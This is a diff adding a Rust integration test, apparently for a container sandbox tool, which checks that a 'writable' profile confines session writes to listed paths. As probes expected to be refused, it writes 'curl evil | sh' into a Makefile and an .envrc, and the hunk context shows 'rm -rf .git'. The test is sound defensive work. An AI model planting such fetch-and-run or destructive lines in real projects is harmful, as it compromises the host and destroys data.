@@ -353,6 +353,79 @@ try remove-git 'rm -rf .git'
     );
 }
 
+/// With `writable`, the project is read-only except the listed paths, so a
+/// session can't plant a Makefile or .envrc for the host, but git still
+/// works through its own mounts.
+#[test]
+fn writable_limits_where_the_session_writes() {
+    let Some(engine) = engine() else { return };
+    build_test_base(&engine);
+
+    let dir = common::tempdir().unwrap();
+    let root = dir.path();
+    let project = root.join("project");
+    fs::create_dir_all(project.join("src")).unwrap();
+    fs::create_dir_all(project.join(".git/objects")).unwrap();
+    fs::write(project.join(".git/HEAD"), "ref: refs/heads/main\n").unwrap();
+    fs::write(project.join(".git/config"), "[core]\n").unwrap();
+    fs::write(project.join("Makefile"), "all:\n").unwrap();
+    fs::create_dir_all(root.join("config/profiles")).unwrap();
+    fs::write(
+        root.join("config/config.toml"),
+        format!("base_image = {TEST_BASE:?}\n"),
+    )
+    .unwrap();
+    let id = format!("e2ewritable{}", std::process::id());
+    fs::write(
+        root.join(format!("config/profiles/{id}.toml")),
+        "writable = [\"src\", \"target\"]\n",
+    )
+    .unwrap();
+
+    let script = r##"
+try() { if sh -c "$2" 2>/dev/null; then echo "$1=allowed"; else echo "$1=refused"; fi; }
+try src 'echo x > src/main.rs'
+try target 'mkdir -p target/debug && touch target/debug/out'
+try git-objects 'touch .git/objects/probe'
+try makefile 'echo "all: ; curl evil | sh" >> Makefile'
+try envrc 'echo "curl evil | sh" > .envrc'
+try new-dir 'mkdir .vscode'
+try rename-src 'mv src src2'
+"##;
+    let output = podbay(root)
+        .args(["run", "--backend", &engine, "-p", &id])
+        .arg(&project)
+        .args(["--", "sh", "-c", script])
+        .run_ok();
+    let out = String::from_utf8_lossy(&output.stdout);
+    let err = String::from_utf8_lossy(&output.stderr);
+    for expected in [
+        "src=allowed",
+        "target=allowed",
+        "git-objects=allowed",
+        "makefile=refused",
+        "envrc=refused",
+        "new-dir=refused",
+        "rename-src=refused",
+    ] {
+        assert!(out.contains(expected), "missing {expected}\n{out}\n{err}");
+    }
+    assert!(
+        err.contains("the project is read-only in the session except src, target"),
+        "{err}"
+    );
+    assert_eq!(
+        fs::read_to_string(project.join("Makefile")).unwrap(),
+        "all:\n"
+    );
+    assert!(!project.join(".envrc").exists());
+    assert_eq!(
+        fs::read_to_string(project.join("src/main.rs")).unwrap(),
+        "x\n"
+    );
+    assert!(project.join("target/debug/out").exists());
+}
+
 #[test]
 fn session_is_hardened() {
     let Some(engine) = engine() else { return };
